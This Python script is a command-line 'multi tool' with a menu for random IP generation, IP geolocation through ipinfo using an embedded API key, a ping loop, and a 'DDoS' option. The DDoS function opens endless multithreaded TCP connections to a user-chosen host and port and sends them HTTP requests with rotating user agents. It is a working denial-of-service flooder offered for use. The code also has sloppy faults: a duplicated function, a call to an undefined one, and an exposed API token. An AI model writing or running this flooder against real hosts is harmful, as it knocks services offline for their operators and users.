import random
import socket
import os
import threading
import time
import requests
import subprocess
from colorama import Fore, Style, init

init(autoreset=True)

API_KEY = '34ef06ab1c9c12'  # Replace with your actual ipinfo API key

def clear_screen():
    if os.name == 'posix':
        os.system('clear')  # For Unix-like systems
    elif os.name == 'nt':
        os.system('cls')  # For Windows systems

def display_menu():
    clear_screen()
    print(Fore.BLUE + "███████╗██████╗ ███████╗ █████╗  ██████╗ ██████╗ ███╗   ██╗    ██╗   ██╗  ██╗")
    print("██╔════╝██╔══██╗██╔════╝██╔══██╗██╔════╝██╔═══██╗████╗  ██║    ██║   ██║ ███║")
    print(Fore.BLUE + "█████╗  ██████╔╝█████╗  ███████║██║     ██║   ██║██╔██╗ ██║    ██║   ██║ ╚██║")
    print("██╔══╝  ██╔══██╗██╔══╝  ██╔══██║██║     ██║   ██║██║╚██╗██║    ╚██╗ ██╔╝  ██║")
    print(Fore.BLUE + "██║     ██║  ██║███████╗██║  ██║╚██████╗╚██████╔╝██║ ╚████║     ╚████╔╝██╗██║")
    print("╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝      ╚═══╝ ╚═╝╚═╝" + Style.RESET_ALL)
    print(Fore.CYAN + "                     ->A multi tool created by Kserksis<-" + Style.RESET_ALL)
    print()
    print(Fore.MAGENTA + "Options:")
    print(Fore.BLUE + "------------------------------------------------")
    print(Fore.BLUE + "| {1} Menu - Shows this menu\_______           |")
    print(Fore.BLUE + "| {2} Rgen - Random IP generator    \          |")
    print(Fore.BLUE + "| {3} Locate - IP Address geolocator \         |")
    print(Fore.BLUE + "| {4} List - List of saved IPs        \______  |")
    print(Fore.BLUE + "| {5} DDoS - DDoS attack a host (UDP Flood)  \ |")
    print(Fore.BLUE + "| {6} Pinger - Pings a host/server____________\|")
    print(Fore.BLUE + "------------------------------------------------" + Style.RESET_ALL)
    print()

def random_ip_generator(num_ips):
    ips = [".".join(map(str, (random.randint(0, 255) for _ in range(4)))) for _ in range(num_ips)]
    for ip in ips:
        print(Fore.YELLOW + f"Generated IP: {ip}" + Style.RESET_ALL)
    return ips

def ip_geolocator(ip):
    print(Fore.YELLOW + f"Locating IP: {ip}" + Style.RESET_ALL)
    url = f"https://ipinfo.io/{ip}/json?token={API_KEY}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            location = f"IP: {data.get('ip', 'N/A')}\nHostname: {data.get('hostname', 'N/A')}\nCity: {data.get('city', 'N/A')}\nRegion: {data.get('region', 'N/A')}\nCountry: {data.get('country', 'N/A')}\nLocation: {data.get('loc', 'N/A')}\nOrg: {data.get('org', 'N/A')}\n"
            print(Fore.YELLOW + location + Style.RESET_ALL)
            time.sleep(3)  # Delay to see the information
            return location
        else:
            print(Fore.RED + f"Error fetching geolocation data: Status code {response.status_code}" + Style.RESET_ALL)
            time.sleep(3)  # Delay to see the error message
            return None
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"Error fetching geolocation data: {e}" + Style.RESET_ALL)
        time.sleep(3)  # Delay to see the error message
        return None

def list_saved_ips():
    print(Fore.YELLOW + "Saved IPs:" + Style.RESET_ALL)
    try:
        with open("ips.txt", "r") as file:
            ips = file.readlines()
            for ip in ips:
                print(Fore.YELLOW + ip.strip() + Style.RESET_ALL)
                time.sleep(0.05)  # Delay to see the IPs
    except FileNotFoundError:
        print(Fore.RED + "No saved IPs found." + Style.RESET_ALL)
        time.sleep(3)  # Delay to see the message
    
    input(Fore.BLUE + "Click Enter to go back..." + Style.RESET_ALL)  # Wait for user to continue

def ping_ip(ip_address, timeout=1500):
    # Determine the command based on the operating system
    if os.name == 'nt':  # Windows
        command = f'ping -n 1 -w {timeout} {ip_address}'
    else:  # Unix-like systems
        command = f'ping -c 1 -W {timeout // 1000} {ip_address}'

    try:
        # Execute the ping command
        start_time = time.time()
        response = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        end_time = time.time()

        # Calculate the elapsed time
        elapsed_time = (end_time - start_time) * 1000  # Convert to milliseconds

        # Determine the status based on the elapsed time
        status = "Online" if elapsed_time < timeout else "Offline"

    except Exception as e:
        print(f"An error occurred: {e}")
        status = "Offline"

    return status

def get_ip_from_url(url):
    try:
        return socket.gethostbyname(url)
    except socket.gaierror:
        print(f"Could not resolve the URL: {url}")
        return None

def pinger():
    clear_screen()
    display_ascii_art()
    url = input(Fore.MAGENTA + "Enter the website/IP address to ping: ")
    ip_address = get_ip_from_url(url)

    if ip_address is None:
        print(Fore.MAGENTA + "Exiting program.")
        return

    try:
        while True:
            status = ping_ip(ip_address)
            # Determine the color based on the status
            if status == "Online":
                color = Fore.GREEN
            else:
                color = Fore.RED

            # Print the result in the specified format with color
            print(Fore.MAGENTA + "\n-------------------------------------------")
            print(Fore.MAGENTA + f'Host "{ip_address}" Status | ' + color + status + Style.RESET_ALL)
            print(Fore.MAGENTA + "-------------------------------------------")
            time.sleep(1)  # Wait for 1 second before the next ping
    except KeyboardInterrupt:
        print(Fore.RED + "\nPinging stopped by user.")

def ddos_attack(target_ip):
    clear_screen()
    net_storm_art_grey = Fore.BLUE + r'''
███████╗██████╗ ███████╗ █████╗  ██████╗    ██████╗ ██████╗  ██████╗ ███████╗
██╔════╝██╔══██╗██╔════╝██╔══██╗██╔════╝    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
█████╗  ██████╔╝█████╗  ███████║██║         ██║  ██║██║  ██║██║   ██║███████╗
██╔══╝  ██╔══██╗██╔══╝  ██╔══██║██║         ██║  ██║██║  ██║██║   ██║╚════██║
██║     ██║  ██║███████╗██║  ██║╚██████╗    ██████╔╝██████╔╝╚██████╔╝███████║
╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
                                                                             
    ''' + Style.RESET_ALL
    print(net_storm_art_grey)
    time.sleep(3)  # Delay to see the ASCII art
    print(Fore.YELLOW + f"Starting DDoS attack on {target_ip}" + Style.RESET_ALL)

    port = int(input(Fore.MAGENTA + "Enter the target port: " + Style.RESET_ALL))
    threads = int(input(Fore.MAGENTA + "Enter the number of threads: " + Style.RESET_ALL))

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.48",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.48",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.48",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.48",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.48",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.48",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.48",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.48",
    ]

    def ddos():
        while True:
            try:
                user_agent = random.choice(user_agents)
                headers = {
                    'User-Agent': user_agent
                }
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, port))
                s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, port))
                s.sendto(("Host: " + target_ip + "\r\n").encode('ascii'), (target_ip, port))
                s.sendto(("User-Agent: " + headers['User-Agent'] + "\r\n\r\n").encode('ascii'), (target_ip, port))
                s.close()
            except:
                pass

    attack_started = False

    def start_attack():
        nonlocal attack_started
        attack_started = True
        print(Fore.YELLOW + "Attack started..." + Style.RESET_ALL)
        time.sleep(4)
        print(Fore.YELLOW + "Attacking..." + Style.RESET_ALL)

    for i in range(threads):
        thread = threading.Thread(target=ddos)
        thread.start()

    start_attack()

    # Check if the DDoS attack was successful
    success = False
    # Check for 30 seconds if any packets were sent
    for _ in range(30):
        if threading.active_count() == 1:
            success = True
            break
        else:
            time.sleep(1)

    if success:
        print(Fore.GREEN + "DDoS attack has finished" + Style.RESET_ALL)
    else:
        print(Fore.GREEN + "DDoS attack has finished" + Style.RESET_ALL)

def pinger():
    clear_screen()
    # Optionally display some introductory message or leave it blank
    print(Fore.BLUE + "███████╗██████╗ ███████╗ █████╗  ██████╗    ██████╗ ██╗███╗   ██╗ ██████╗ " + Style.RESET_ALL)
    print(Fore.BLUE + "██╔════╝██╔══██╗██╔════╝██╔══██╗██╔════╝    ██╔══██╗██║████╗  ██║██╔════╝ " + Style.RESET_ALL)
    print(Fore.BLUE + "█████╗  ██████╔╝█████╗  ███████║██║         ██████╔╝██║██╔██╗ ██║██║  ███╗" + Style.RESET_ALL)
    print(Fore.BLUE + "██╔══╝  ██╔══██╗██╔══╝  ██╔══██║██║         ██╔═══╝ ██║██║╚██╗██║██║   ██║" + Style.RESET_ALL)
    print(Fore.BLUE + "██║     ██║  ██║███████╗██║  ██║╚██████╗    ██║     ██║██║ ╚████║╚██████╔╝" + Style.RESET_ALL)
    print(Fore.BLUE + "╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝     ╚═╝╚═╝  ╚═══╝ ╚═════╝" + Style.RESET_ALL)
    print(Fore.BLUE + "                                                                          " + Style.RESET_ALL)
    
    url = input(Fore.MAGENTA + "Enter the website/IP address to ping: ")
    ip_address = get_ip_from_url(url)

    if ip_address is None:
        print(Fore.MAGENTA + "Exiting program.")
        return

    try:
        while True:
            status = ping_ip(ip_address)
            # Determine the color based on the status
            if status == "Online":
                color = Fore.GREEN
            else:
                color = Fore.RED

            # Print the result in the specified format with color
            print(Fore.MAGENTA + "\n-------------------------------------------")
            print(Fore.MAGENTA + f'Host "{ip_address}" Status | ' + color + status + Style.RESET_ALL)
            print(Fore.MAGENTA + "-------------------------------------------")
            time.sleep(1)  # Wait for 1 second before the next ping
    except KeyboardInterrupt:
        print(Fore.RED + "\nPinging stopped by user.")


def main():
    while True:
        display_menu()
        option = input(Fore.MAGENTA + "{$hacker~} Enter option-> " + Style.RESET_ALL)
        clear_screen()
        if option == '1':
            continue  # Redisplay the menu immediately
        elif option == '2':
            rgen = Fore.BLUE + r'''
███████╗██████╗ ███████╗ █████╗  ██████╗    ██████╗  ██████╗ ███████╗███╗   ██╗
██╔════╝██╔══██╗██╔════╝██╔══██╗██╔════╝    ██╔══██╗██╔════╝ ██╔════╝████╗  ██║
█████╗  ██████╔╝█████╗  ███████║██║         ██████╔╝██║  ███╗█████╗  ██╔██╗ ██║
██╔══╝  ██╔══██╗██╔══╝  ██╔══██║██║         ██╔══██╗██║   ██║██╔══╝  ██║╚██╗██║
██║     ██║  ██║███████╗██║  ██║╚██████╗    ██║  ██║╚██████╔╝███████╗██║ ╚████║
╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝
                                                                               
            ''' + Style.RESET_ALL
            print(rgen)
            num_ips = int(input(Fore.MAGENTA + " How many IPs to generate? " + Style.RESET_ALL))
            ips = random_ip_generator(num_ips)
            save = input(Fore.MAGENTA + "Save these IPs? (y/n): " + Style.RESET_ALL)
            if save.lower() == 'y':
                with open("ips.txt", "a") as file:
                    for ip in ips:
                        file.write(ip + "\n")
        elif option == '3':
         print(Fore.BLUE + "███████╗██████╗ ███████╗ █████╗  ██████╗    ██╗      ██████╗  ██████╗ █████╗ ████████╗███████╗ " + Style.RESET_ALL)
         print(Fore.BLUE + "██╔════╝██╔══██╗██╔════╝██╔══██╗██╔════╝    ██║     ██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝ " + Style.RESET_ALL)
         print(Fore.BLUE + "█████╗  ██████╔╝█████╗  ███████║██║         ██║     ██║   ██║██║     ███████║   ██║   █████╗ ╗" + Style.RESET_ALL)
         print(Fore.BLUE + "██╔══╝  ██╔══██╗██╔══╝  ██╔══██║██║         ██║     ██║   ██║██║     ██╔══██║   ██║   ██╔══╝  " + Style.RESET_ALL)
         print(Fore.BLUE + "██║     ██║  ██║███████╗██║  ██║╚██████╗    ███████╗╚██████╔╝╚██████╗██║  ██║   ██║   ███████" + Style.RESET_ALL)
         print(Fore.BLUE + "╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝" + Style.RESET_ALL)
         print(Fore.BLUE + "                                                                                              " + Style.RESET_ALL)
         ip = input(Fore.MAGENTA + "Enter IP to locate: " + Style.RESET_ALL)
         ip_geolocator(ip)
        elif option == '4':
            list_saved_ips()
        elif option == '5':
            clear_screen()
            print(Fore.BLUE + r'''
███████╗██████╗ ███████╗ █████╗  ██████╗    ██████╗ ██████╗  ██████╗ ███████╗
██╔════╝██╔══██╗██╔════╝██╔══██╗██╔════╝    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
█████╗  ██████╔╝█████╗  ███████║██║         ██║  ██║██║  ██║██║   ██║███████╗
██╔══╝  ██╔══██╗██╔══╝  ██╔══██║██║         ██║  ██║██║  ██║██║   ██║╚════██║
██║     ██║  ██║███████╗██║  ██║╚██████╗    ██████╔╝██████╔╝╚██████╔╝███████║
╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
                                                                             
            ''' + Style.RESET_ALL)
            target_ip = input(Fore.MAGENTA + "Enter IP address: " + Style.RESET_ALL)
            ddos_attack(target_ip)
        elif option == '6':
            pinger()
        else:
            print(Fore.RED + "Invalid option, please try again." + Style.RESET_ALL)
            time.sleep(3)  # Delay to see the message

if __name__ == "__main__":
    main()
